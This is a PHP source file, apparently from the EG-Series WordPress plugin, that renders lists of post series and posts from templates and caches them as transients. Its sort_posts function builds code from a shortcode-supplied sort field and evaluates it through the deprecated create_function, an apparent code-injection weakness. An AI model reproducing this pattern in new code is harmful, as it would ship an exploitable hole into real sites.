			if ( 0 == $width || $width >= mb_strlen($string) )
				$new_string = $string;
			else {
				$new_string = mb_substr($string, 0, $width).'...';
			}
			return esc_html($new_string);
		} // End of shorten_string

		/**
		 * replace_serie_tokens
		 *
		 *
		 *
		 * @param	string	$template		format to convert
		 * @param	object	$serie			serie to be used as input
		 * @return	string					filled template
		 */
		static function replace_series_tokens($template, $item, $series_list, $serie_id, $args, $options, $textdomain) {
			global $EGS_SHORTCODE_POSTS_DEFAULTS;

			if ('loop' == $item && 1 == $args['listposts'] && '' != $template['loop_with_posts']) {
				$item = 'loop_with_posts';
			}
// eg_plugin_error_log('EG-Series-Common', 'Series list : ', $series_list);

			$string = $template[$item];
			if (FALSE !== $serie_id) {
// eg_plugin_error_log('EG-Series-Common', 'Series id : ', $serie_id);
				$serie = $series_list[$serie_id];

				$name = self::shorten_string($serie->name, $args['width']);

				$string = str_replace('%SERIE_LINK%',		$serie->link, 					$string );
				$string = str_replace('%SERIE_NAME%', 		esc_html($name), 				$string );
				$string = str_replace('%SERIE_FULL_NAME%', 	esc_html($serie->name), 		$string );
				$string = str_replace('%DESCRIPTION%', 		esc_html($serie->description),	$string );
				$string = str_replace('%NUMBER_OF_POSTS%',	$serie->count, 					$string );

			} // End of serie defined

			if (0 == $args['number']) {
				$string = str_replace('%NUMBER_OF_SERIES_DISPLAYED%', '', $string);
			}
			else {
				$string = str_replace('%NUMBER_OF_SERIES_DISPLAYED%',
									sprintf(esc_html__('%s on %s series displayed ', $textdomain), $args['number'], sizeof($series_list)), $string);
			}

			/* --- Manage description shortcode parameter --- */
			if (0 == $args['description'] || FALSE === strpos($string, '%SERIE_DESC%')) {
				$string = str_replace('%SERIE_DESC%', '', $string);
			}
			else {
				$string = str_replace('%SERIE_DESC%',  self::replace_series_tokens($template, 'serie_desc', $series_list, $serie_id, $args, $options, $textdomain),$string);
			}

			/* --- Manage show_count shortcode parameter --- */
			if (0 == $args['show_count'] || FALSE === strpos($string, '%SERIE_COUNT%')) {
				$string = str_replace('%SERIE_COUNT%', '', $string);
			}
			else {
				$string = str_replace('%SERIE_COUNT%',  self::replace_series_tokens($template, 'serie_count', $series_list, $serie_id, $args, $options, $textdomain),$string);
			}

			/* --- Manage MORE shortcode parameter --- */
			if (0 == $args['more'] || 0 == $args['number']) {
				$string = str_replace('%MORE%', '', $string);
			}
			else {
				if (FALSE !== strpos($string, '%MORE%'))
					$string = str_replace('%MORE%', self::replace_series_tokens($template, 'more', $series_list, $serie_id, $args, $options, $textdomain), $string);

				$more_series = self::shorten_string(__('Display all series', $textdomain), $args['width']);
				$string = str_replace('%MORE_DESC%', 		$more_series,						$string);
				$string = str_replace('%MORE_LINK%', 		get_permalink($args['more']), 		$string);
				$string = str_replace('%MORE_NAME%', 		$more_series,						$string);
			}

			if (0 == $args['listposts'] || FALSE == strpos($string, '%SERIE_POSTS%')) {
				$string = str_replace('%SERIE_POSTS%', '', $string);
			}
			else {
				$list_posts = '';
				if ( 0 < $args['listposts'] ) {
					$list_posts = self::posts_list(wp_parse_args( array(
								'sid'	    	=> $serie_id,
								'listtype'  	=> $args['listtype'],
								'orderby'  		=> $args['post_orderby'],
								'order'	    	=> $args['post_order'],
								'show_date' 	=> $args['show_date'],
								'width'			=> $args['width'],
								'numposts'		=> $args['numposts'],
								'expand'		=> $args['expand']), $EGS_SHORTCODE_POSTS_DEFAULTS),
						$options,
						$textdomain
					);
				}
				$string = str_replace('%SERIE_POSTS%', $list_posts, $string);
			}
			return ($string);
		} // End of replace_serie_tokens


		/**
		 * series_list
		 *
		 * List series, and their posts (if requested)
		 *
		 * @param	array	$args				shortcode parameters
		 * @param	array	$options			plugin's options
		 * @return	string						list of the series
		 */
		static function series_list($args, $options, $textdomain) {
			global $EGS_SHORTCODE_SERIES_DEFAULTS;

// eg_plugin_error_log('EG-Series-Common', 'Starting SERIES shortcode');

//			if (is_singular()) {
				global $post;
				if ( $post && (post_password_required($post->ID) || ('private' == get_post_status($post->ID)  && !is_user_logged_in())) ) {
					return '';
				}
//			}

// eg_plugin_error_log('EG-Series-Common', 'SERIES shortcode: Security ok.');

			extract( shortcode_atts( $EGS_SHORTCODE_SERIES_DEFAULTS, $args ) );

			$serie_templates = array(
				'ul' =>	array(
						'pre' 			=> '<ul class="egs-series">'."\n",
						'loop'			=> '<li class="egs-series-item">'."\n".'<a class="egs-series-item-title" href="%SERIE_LINK%" title="%SERIE_FULL_NAME%" >%SERIE_NAME%</a>'."\n".'%SERIE_COUNT%%SERIE_DESC%%SERIE_POSTS%</li>'."\n",
						'loop_with_posts' => '',
						'post'			=> '%MORE%'."\n".'</ul>'."\n".'%NUMBER_OF_SERIES_DISPLAYED%',
						'serie_count' 	=> '<span class="egs-series-count"> (%NUMBER_OF_POSTS%)</span>'."\n",
						'serie_desc' 	=> '<br /><span class="egs-series-desc">%DESCRIPTION%</span>'."\n",
						'more'			=>  '<li class="egs-series-item egs-series-more"><a class="egs-series-item-title" href="%MORE_LINK%" title="%MORE_DESC%">%MORE_NAME%</a></li>'
					),
				'ol' =>	array(
						'pre' 			=> '<ol class="egs-series">'."\n",
						'loop'			=> '<li class="egs-series-item">'."\n".'<a class="egs-series-item-title" href="%SERIE_LINK%" title="%SERIE_FULL_NAME%" >%SERIE_NAME%</a>%SERIE_COUNT%%SERIE_DESC%%SERIE_POSTS%</li>',
						'loop_with_posts' => '',
						'post'			=> '%MORE%</ol>%NUMBER_OF_SERIES_DISPLAYED%',
						'serie_count' 	=> '<span class="egs-series-count"> (%NUMBER_OF_POSTS%)</span>',
						'serie_desc' 	=> '<br /><span class="egs-series-desc">%DESCRIPTION%</span>',
						'more'			=>  '<li class="egs-series-item egs-series-more"><a class="egs-series-item-title" href="%MORE_LINK%" title="%MORE_DESC%">%MORE_NAME%</a></li>'
					),
				'select' =>	array(
						'pre'			=> '<select onChange="if (this.value!=\'\') { window.location=this.value}" >'.
											'<option class="egs-series-item" value="#">'.esc_html__('Select a serie ...', $textdomain).'</option>',
						'loop'			=> '<option class="egs-series-item" value="%SERIE_LINK%">%SERIE_NAME%%SERIE_COUNT%</option>',
						'loop_with_posts' => '<optgroup label="%SERIE_NAME%">'."\n".
											'<option class="egs-series-item" value="%SERIE_LINK%">'.esc_html__('The serie', $textdomain).'</option>'."\n".
											'%SERIE_POSTS%'."\n".
											'</optgroup>',
						'post'			=> '%MORE%</select>%NUMBER_OF_SERIES_DISPLAYED%',
						'serie_count'	=> '<span class="egs-series-count"> (%NUMBER_OF_POSTS%)</span>',
						'serie_desc'	=> '<br /><span class="egs-series-desc">%DESCRIPTION%</span>',
						'more'			=>  '<option class="egs-series-item egs-series-more" value="%MORE_LINK%">%MORE_NAME%</option>'
					)
			);

			$string = '';
			// Get the list of series
			$series_list = self::get_series_list($options);
			if ($series_list) {

				if (0 != $number && $number >= sizeof($series_list)) {
					$args['number'] = 0;
					$number			= 0;
				}
				$template = $serie_templates[$listtype];
				$string = self::replace_series_tokens($template, 'pre', $series_list, FALSE, $args, $options, $textdomain)."\n";
				$num_loop = 1;
				foreach ($series_list as $serie) {
					if (1 == $hide_empty && 0 == $serie->count)
						continue;

					$string .= self::replace_series_tokens($template, 'loop', $series_list, $serie->term_id, $args, $options, $textdomain)."\n";
					if (0 != $number && (++$num_loop) > $number)
						break;
				} // End of foreach series
				$string .= self::replace_series_tokens($template, 'post', $series_list, FALSE, $args, $options, $textdomain)."\n";
			} // End of $series_list
			return ($string);
		} // End of eg_series_series_list

		/**
		 * sort_posts
		 *
		 * Sorts posts returned from the cache
		 *
		 * @param 	array		posts		posts (array of objects)
		 * @param 	string		$orderby	Field to use as sort key
		 * @param 	string		$order		ASC or DESC
		 *
		 * @return 	none
		 */
		static function sort_posts(& $posts, $order_by, $order) {
			$compare = ($order === 'ASC')
						? 'return  strcmp($a->'.$order_by.', $b->'.$order_by.');'
						: 'return -strcmp($a->'.$order_by.', $b->'.$order_by.');';
			uasort($posts, create_function('$a,$b', $compare));
		} // End of sort_posts

		/**
		 * get_excerpt
		 *
		 * Extract and return excerpt from a post
		 *
		 * @package EG-Series
		 * @param object	$post				$post to extract excerpt
		 * @return string						excerpt of the specified post
		 */
		static function get_excerpt($post) {

			// TODO: manage private posts if required
			if ( post_password_required($post) )
				$string = get_the_password_form();
			else {
				if (! empty($post->post_excerpt)) {
					$string = htmlspecialchars(strip_tags($post->post_excerpt));
				}
				else {
					if ( preg_match('/<!--more(.*?)?-->/', $post->post_content, $matches) ) {
						$string = htmlspecialchars(strip_tags(current(explode($matches[0], $post->post_content, 2))));
					}
					else {
						$string = wp_html_excerpt($post->post_content, 150);
					}
				}
			}
			return ($string);
		} // End of eg_series_get_excerpt


		/**
		 * get_posts_of_a_serie
		 *
		 * List posts of a serie
		 *
		 * @param	int		$serie_id		Id of a serie
		 * @return	array					List of posts
		 */
		static function get_posts_of_a_serie($serie_id, $options, $orderby, $order) {

			/* --- Order parameters --- */
			if (in_array($orderby, array('title', 'date')))
				$orderby = 'post_'.$orderby;
			elseif ('user_order' == $orderby)
				$orderby = 'menu_order';

			/* --- Get data from the cache --- */
			$cache_id = EGS_PLUGIN_NAME.'-posts-'.$serie_id;
			$posts_list = (EGS_CACHE ? get_transient($cache_id) : FALSE);
			if ($posts_list) {
 //eg_plugin_error_log('EG_Series_Common', 'get_posts_of_a_serie: Get posts, use cache');
				self::sort_posts($posts_list, $orderby, $order);
			}
			else {
				$posts = get_posts(array(
					'tax_query' => array(
						array(
							'taxonomy' => EGS_TAXONOMY,
							'field' => 'id',
							'terms' => $serie_id
						)
					),
					'orderby'			=> $orderby,
					'order'				=> $order,
					'post_type'			=> array_merge( array('post'), (array)$options['custom_post_types']),
					'posts_per_page'	=> -1)
				);

				if ($posts) {
					foreach ($posts as $post) {
						$posts_list[$post->ID] 				= new stdClass();
						$posts_list[$post->ID]->ID		 	= $post->ID;
						$posts_list[$post->ID]->post_title 	= $post->post_title;
						$posts_list[$post->ID]->excerpt 	= self::get_excerpt($post);
						$posts_list[$post->ID]->permalink 	= get_permalink($post->ID);
						$posts_list[$post->ID]->post_date	= $post->post_date;
						$posts_list[$post->ID]->menu_order	= $post->menu_order;
					} // End of foreach
					if (EGS_CACHE) set_transient($cache_id, $posts_list, EGS_CACHE_POSTS );
//eg_plugin_error_log('EG_Series_Common', 'get_posts_of_a_serie: No cache, query DB', sizeof($posts));
				} // End of posts found
			} // End of getting posts from the DB
			return ($posts_list);
		} // End of get_posts_of_a_serie

		/**
		 * replace_post_tokens
		 *
		 *
		 *
		 * @param	string	$template		format to convert
		 * @param	object	$post			post to be used as input
		 * @return	string					filled template
		 */
		static function replace_post_tokens($template, $item, $post, $args, $date_format, $textdomain) {

			$string = $template[$item];
			if ($post) {
				$string = str_replace('%POST_LINK%', 	$post->permalink, 											$string);
				$string = str_replace('%POST_EXCERPT%', esc_html($post->excerpt), 									$string);
				$string = str_replace('%DATE_FORMAT%', 	date_i18n($date_format, strtotime($post->post_date)), 		$string);
				$string = str_replace('%POST_NAME%', 	self::shorten_string($post->post_title, $args['width']), 	$string);
			}

			if (0 == $args['show_date'] ) {
				$string = str_replace('%POST_DATE%', '', $string);
			}
			elseif (FALSE !== strpos($string, '%POST_DATE%')) {
				$string = str_replace('%POST_DATE%', self::replace_post_tokens($template, 'post_date', $post, $args,  $date_format, $textdomain), $string);
			}

			if (0 == $args['expand']) {
				$string = str_replace('%POST_DESC%', '', $string);
			}
			elseif (FALSE !== strpos($string, '%POST_DESC%')) {
				$string = str_replace('%POST_DESC%', self::replace_post_tokens($template, 'post_desc', $post, $args, $date_format, $textdomain), $string);
			}
			return ($string);
		} // End of replace_post_tokens


		/**
		 * posts_list
		 *
		 * Implement shortcode to display list of posts
		 *
		 * @param 	none
		 * @return 	none
		 */
		static function posts_list($args, $options, $textdomain, $include_pre_post=1) {
			global $EGS_SHORTCODE_POSTS_DEFAULTS;

// eg_plugin_error_log('EG-Series-Common', 'Starting POSTS shortcode', $args);

//			if (is_singular()) {
				global $post;
				if ( $post && (post_password_required($post->ID) || ('private' == get_post_status($post->ID)  && !is_user_logged_in())) ) {
					return '';
				}
//			} // End of is_singular

//eg_plugin_error_log('EG-Series-Common', 'POSTS shortcode: Security Ok.');

			extract(shortcode_atts( $EGS_SHORTCODE_POSTS_DEFAULTS, $args ));
			// if (!isset($include_select)) $include_select=1;

			$post_templates = array(
				'ul' =>	array(
						'pre' 		=> ($include_pre_post ? '<ul class="egs-posts">' : ''),
						'loop'		=> '<li class="egs-posts-item">'.
										'<a  class="egs-posts-item-title" href="%POST_LINK%" title="%POST_NAME%">%POST_NAME%</a>'.
										'%POST_DATE%%POST_DESC%</li>',
						'post'		=> ($include_pre_post ? '</ul>' : ''),
						'post_date' => '<span class="egs-posts-item-date"> (%DATE_FORMAT%)</span>',
						'post_desc' => '<br /><span class="egs-posts-item-excerpt">%POST_EXCERPT%</span>'
					),
				'ol' =>	array(
						'pre' 		=> ($include_pre_post ? '<ol class="egs-posts">' : ''),
						'loop'		=> '<li class="egs-posts-item">'.
										'<a  class="egs-posts-item-title" href="%POST_LINK%" title="%POST_NAME%">%POST_NAME%</a>'.
										'%POST_DATE%%POST_DESC%</li>',
						'post'		=> ($include_pre_post ? '</ol>' : ''),
						'post_date' => '<span class="egs-posts-item-date"> (%DATE_FORMAT%)</span>',
						'post_desc' => '<br /><span class="egs-posts-item-excerpt">%POST_EXCERPT%</span>'
					),
				'select' =>	array(
						'pre' 	=> ($include_pre_post ? '<select onChange="if (this.value!=\'\') { window.location=this.value}" >' : ''),
						'loop'	=> '<option value="%POST_LINK%">%POST_NAME%'.($show_date?' (%POST_DATE%)':'').'</option>',
						'post'	=> ($include_pre_post ? '</select>' : ''),
						'post_date'  => '%DATE_FORMAT%'
					)
			);

			$string = '';
			$serie = self::get_the_serie($sid, $name, $id);
			if ($serie) {
			
					$series_posts = self::get_posts_of_a_serie($serie->term_id, $options, $orderby, $order);

					if ($series_posts) {
						$date_format = ( '' != $options['date_format'] ? $options['date_format'] : get_option('date_format') );
						$template = $post_templates[$listtype];

						$string .= self::replace_post_tokens($template, 'pre', FALSE, $args, $date_format, $textdomain)."\n";
						$num_loop = 1;
						foreach ($series_posts as $series_post) {
							$string .= self::replace_post_tokens($template, 'loop', $series_post, $args, $date_format, $textdomain)."\n";

							if (0 != $numposts && (++$num_loop) > $numposts)
								break;
						} // End of foreach series
						$string .= self::replace_post_tokens($template, 'post', FALSE, $args, $date_format, $textdomain)."\n";

					} // End of posts_found

			} // End of serie defined
			return ($string);
		} // End of posts_list

		/**
		 * list_of_cache
		 *
		 * Build and return list of cache entries
		 *
		 * @param 	none
		 * @return 	none
		 */
		static function list_of_cache($options, $textdomain) {

			global $wpdb;

			$cache_list = FALSE;
			$series = self::get_series_list($options, FALSE);

			$series_list = get_transient( EGS_PLUGIN_NAME.'-series' );
			if ( $series_list ) {
				$cache_list[0] = esc_html__( 'List of series' , $textdomain);
			}

			/* --- Get list of cache --- */
			$transient_list = $wpdb->get_results('SELECT option_name FROM '.$wpdb->options.' WHERE option_name like "_transient_'.EGS_PLUGIN_NAME.'-posts%"');
			if ( $transient_list ) {
				foreach ($transient_list as $value) {

					$serie_id = str_replace( '_transient_'.EGS_PLUGIN_NAME.'-posts-', '', $value->option_name );

					$cache_list[$serie_id] = esc_html__('Posts list for the serie ', $textdomain).$serie_id;
					if ( isset( $series[$serie_id] ) )
						$cache_list[$serie_id] .= ' ('.$series[$serie_id]->name.')';

				}
			}
			/*
			if ( FALSE !== $cache_list ) {
				$cache_list = '<ul><li>'.implode($cache_list,'</li><li>').'</li></ul>';
			}*/
			return ($cache_list);
		} // End of list_of_cache

	} // End of class EG_Series_Common

} // End of class_exists

?>